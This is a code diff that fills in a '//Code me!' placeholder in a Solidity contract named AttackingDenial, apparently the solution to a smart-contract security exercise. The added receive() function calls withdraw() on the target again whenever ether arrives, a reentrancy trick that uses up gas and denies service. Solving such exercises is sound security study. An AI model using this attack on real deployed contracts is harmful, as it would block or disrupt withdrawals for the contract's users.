@@ -9,5 +9,11 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        (bool s, ) = contractAddress.call(
+            abi.encodeWithSignature("withdraw()")
+        );
+
+        s;
+    }
 }
